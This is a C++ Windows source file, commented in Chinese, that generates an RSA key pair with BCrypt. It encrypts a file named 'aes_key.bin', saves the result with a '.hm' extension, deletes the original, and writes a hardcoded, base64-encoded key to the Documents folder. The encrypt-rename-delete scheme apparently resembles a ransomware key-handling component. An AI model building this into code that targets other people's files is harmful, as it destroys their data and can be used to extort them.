#include <windows.h>
#include <bcrypt.h>
#include <iostream>
#include <fstream>
#include <vector>
#include <string>
#include <filesystem>
#include <shlobj.h>
#pragma comment(lib, "bcrypt.lib")
#pragma comment(lib, "shell32.lib")

// 手动定义 NT_SUCCESS 宏
#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)

// Base64 编码表
const std::string base64_chars =
"ABCDEFGHIJKLMNOPQRSTUVWXYZ"
"abcdefghijklmnopqrstuvwxyz"
"0123456789+/";

// Base64 编码函数
std::string base64_encode(const std::string& input) {
    std::string output;
    int val = 0;
    int val_bits = -6;
    for (unsigned char c : input) {
        val = (val << 8) + c;
        val_bits += 8;
        while (val_bits >= 0) {
            output.push_back(base64_chars[(val >> val_bits) & 0x3F]);
            val_bits -= 6;
        }
    }
    if (val_bits > -6) {
        output.push_back(base64_chars[((val << 8) >> (val_bits + 8)) & 0x3F]);
    }
    while (output.size() % 4) {
        output.push_back('=');
    }
    return output;
}

// 错误处理函数
// 确保在调用函数之前已经定义了它


void handleError(const char* message) {
    std::cerr << message << " Error code: " << GetLastError() << std::endl;
    exit(1);
}
// 确保在调用函数之前已经定义了它
ULONG detectMaxRSAKeyLength() {
    BCRYPT_ALG_HANDLE hAlg = NULL;
    NTSTATUS status = BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_RSA_ALGORITHM, NULL, 0);
    if (!NT_SUCCESS(status)) {
        handleError("Failed to open algorithm provider for key length detection.");
    }

    const ULONG possibleKeyLengths[] = { 2048, 4096 };  // 只尝试 2048 和 4096 位
    ULONG maxKeyLength = 0;
    for (ULONG keyLength : possibleKeyLengths) {
        status = BCryptSetProperty(hAlg, BCRYPT_KEY_LENGTH, reinterpret_cast<PUCHAR>(&keyLength), sizeof(keyLength), 0);
        if (NT_SUCCESS(status)) {
            maxKeyLength = keyLength;
        }
    }

    BCryptCloseAlgorithmProvider(hAlg, 0);
    return maxKeyLength;
}

// 保存密钥到文件
void saveKeyToFile(const std::wstring& filename, const std::string& key) {
    std::ofstream file(filename);
    if (!file) {
        handleError("Failed to open file for writing key.");
    }
    file << key;
    file.close();
}

// 读取文件内容到字节向量
std::vector<BYTE> readFile(const std::wstring& filename) {
    std::ifstream file(filename, std::ios::binary | std::ios::ate);
    if (!file) {
        handleError("Failed to open file for reading.");
    }
    std::streamsize size = file.tellg();
    file.seekg(0, std::ios::beg);

    std::vector<BYTE> buffer(size);
    if (file.read(reinterpret_cast<char*>(buffer.data()), size)) {
        return buffer;
    }
    handleError("Failed to read file.");
    return {};
}

// 写入字节向量到文件
void writeFile(const std::wstring& filename, const std::vector<BYTE>& data) {
    std::ofstream file(filename, std::ios::binary);
    if (!file) {
        handleError("Failed to open file for writing.");
    }
    file.write(reinterpret_cast<const char*>(data.data()), data.size());
    file.close();
}

// 检测系统支持的最大 RSA 密钥长度
void rsaEncryptFile(const std::wstring& inputFilePath, const std::wstring& publicKeyPath, const std::wstring& privateKeyPath) {
    BCRYPT_ALG_HANDLE hAlg = NULL;
    BCRYPT_KEY_HANDLE hKey = NULL;
    NTSTATUS status;
    SetConsoleOutputCP(CP_UTF8);
    std::wcout << L"Input file path: " << inputFilePath << std::endl;
    std::wcout << L"Public key path: " << publicKeyPath << std::endl;
    std::wcout << L"Private key path: " << privateKeyPath << std::endl;

    // 打开 RSA 算法提供程序
    status = BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_RSA_ALGORITHM, NULL, 0);
    if (!NT_SUCCESS(status)) {
        handleError("Failed to open algorithm provider.");
    }

    // 检测系统支持的最大密钥长度
    ULONG maxKeyLength = detectMaxRSAKeyLength();
    if (maxKeyLength == 0) {
        handleError("Could not determine a supported key length.");
    }

    // 设置密钥长度
    status = BCryptSetProperty(hAlg, BCRYPT_KEY_LENGTH, reinterpret_cast<PUCHAR>(&maxKeyLength), sizeof(maxKeyLength), 0);
    if (!NT_SUCCESS(status)) {
        BCryptCloseAlgorithmProvider(hAlg, 0);
        handleError("Failed to set key length.");
    }

    // 生成密钥对
    status = BCryptGenerateKeyPair(hAlg, &hKey, 0, 0);
    if (!NT_SUCCESS(status)) {
        BCryptCloseAlgorithmProvider(hAlg, 0);
        handleError("Failed to generate key pair.");
    }

    // 最终确定密钥
    status = BCryptFinalizeKeyPair(hKey, 0);
    if (!NT_SUCCESS(status)) {
        BCryptDestroyKey(hKey);
        BCryptCloseAlgorithmProvider(hAlg, 0);
        handleError("Failed to finalize key pair.");
    }

    // 导出公钥
    ULONG cbPublicKeyBlob = 0;
    status = BCryptExportKey(hKey, NULL, BCRYPT_RSAPUBLIC_BLOB, NULL, 0, &cbPublicKeyBlob, 0);
    if (!NT_SUCCESS(status)) {
        BCryptDestroyKey(hKey);
        BCryptCloseAlgorithmProvider(hAlg, 0);
        handleError("Failed to get public key blob size.");
    }
    std::vector<BYTE> publicKeyBlob(cbPublicKeyBlob);
    status = BCryptExportKey(hKey, NULL, BCRYPT_RSAPUBLIC_BLOB, publicKeyBlob.data(), cbPublicKeyBlob, &cbPublicKeyBlob, 0);
    if (!NT_SUCCESS(status)) {
        BCryptDestroyKey(hKey);
        BCryptCloseAlgorithmProvider(hAlg, 0);
        handleError("Failed to export public key.");
    }

    std::cout << "Public key exported successfully." << std::endl;  // Debugging line
    std::string publicKeyStr(publicKeyBlob.begin(), publicKeyBlob.end());
    saveKeyToFile(publicKeyPath, publicKeyStr);

    // 导出私钥
    ULONG cbPrivateKeyBlob = 0;
    status = BCryptExportKey(hKey, NULL, BCRYPT_RSAPRIVATE_BLOB, NULL, 0, &cbPrivateKeyBlob, 0);
    if (!NT_SUCCESS(status)) {
        BCryptDestroyKey(hKey);
        BCryptCloseAlgorithmProvider(hAlg, 0);
        handleError("Failed to get private key blob size.");
    }
    std::vector<BYTE> privateKeyBlob(cbPrivateKeyBlob);
    status = BCryptExportKey(hKey, NULL, BCRYPT_RSAPRIVATE_BLOB, privateKeyBlob.data(), cbPrivateKeyBlob, &cbPrivateKeyBlob, 0);
    if (!NT_SUCCESS(status)) {
        BCryptDestroyKey(hKey);
        BCryptCloseAlgorithmProvider(hAlg, 0);
        handleError("Failed to export private key.");
    }

    std::cout << "Private key exported successfully." << std::endl;  // Debugging line
    std::string privateKeyStr(privateKeyBlob.begin(), privateKeyBlob.end());
    saveKeyToFile(privateKeyPath, privateKeyStr);

    // 读取要加密的文件内容
    std::vector<BYTE> plaintext = readFile(inputFilePath);

    // 加密文件内容
    ULONG cbCiphertext = 0;
    status = BCryptEncrypt(hKey, plaintext.data(), static_cast<ULONG>(plaintext.size()), NULL, NULL, 0, NULL, 0, &cbCiphertext, BCRYPT_PAD_PKCS1);
    if (!NT_SUCCESS(status)) {
        BCryptDestroyKey(hKey);
        BCryptCloseAlgorithmProvider(hAlg, 0);
        handleError("Failed to get ciphertext size.");
    }
    std::vector<BYTE> ciphertext(cbCiphertext);
    status = BCryptEncrypt(hKey, plaintext.data(), static_cast<ULONG>(plaintext.size()), NULL, NULL, 0, ciphertext.data(), cbCiphertext, &cbCiphertext, BCRYPT_PAD_PKCS1);
    if (!NT_SUCCESS(status)) {
        BCryptDestroyKey(hKey);
        BCryptCloseAlgorithmProvider(hAlg, 0);
        handleError("Failed to encrypt data.");
    }

    // 加密后的文件路径
    std::wstring encryptedFilePath = inputFilePath + L".hm";  // 修改后缀为 .hm
    std::wcout << L"Encrypted file path: " << encryptedFilePath << std::endl;

    // 检查加密后的文件路径
    if (std::filesystem::exists(encryptedFilePath)) {
        std::wcout << L"File exists: " << encryptedFilePath << std::endl;
    }
    else {
        std::wcout << L"File does NOT exist: " << encryptedFilePath << std::endl;
    }

    // 写入加密后的内容到新文件
    writeFile(encryptedFilePath, ciphertext);

    // 删除原始文件
    if (!std::filesystem::remove(inputFilePath)) {
        handleError("Failed to remove original file.");
    }

    // 清理资源
    BCryptDestroyKey(hKey);
    BCryptCloseAlgorithmProvider(hAlg, 0);
}


int encryptrsa() {
    SetConsoleOutputCP(CP_UTF8);
    std::wstring inputFilePath = L"aes_key.bin";
    std::wstring publicKeyPath = L"public_key.bin";
    std::wstring privateKeyPath = L"private_key.bin";

    // 固定密钥
    std::string key = "abcdefghyfhyfmylmyl";
    // Base64 编码密钥
    std::string encodedKey = base64_encode(key);

    // 获取系统文档文件夹路径
    PWSTR pszPath = nullptr;
    if (SUCCEEDED(SHGetKnownFolderPath(FOLDERID_Documents, 0, NULL, &pszPath))) {
        std::wstring documentsPath(pszPath);
        CoTaskMemFree(pszPath);  // 释放内存

        // 构建编码后密钥文件的完整路径
        std::wstring encodedKeyPath = documentsPath + L"\\encoded_key.txt";

        // 保存编码后的密钥到文件
        saveKeyToFile(encodedKeyPath, encodedKey);

        // 执行 RSA 加密操作
        rsaEncryptFile(inputFilePath, publicKeyPath, privateKeyPath);

        std::cout << "Encryption completed successfully." << std::endl;
        std::wcout << L"Encoded key saved to: " << encodedKeyPath << std::endl;
    }
    else {
        handleError("Failed to get documents folder path.");
    }

    return 0;
}


